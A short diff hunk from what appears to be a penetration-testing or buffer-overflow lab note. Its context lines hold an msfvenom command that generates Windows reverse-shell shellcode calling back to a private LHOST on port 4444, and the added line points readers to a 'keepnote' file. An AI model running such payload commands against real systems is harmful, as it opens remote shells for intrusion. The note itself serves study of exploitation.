@@ -561,3 +561,6 @@ except:
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.205.128 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
 ```
+
+**if require more information than refer the keepnote
+
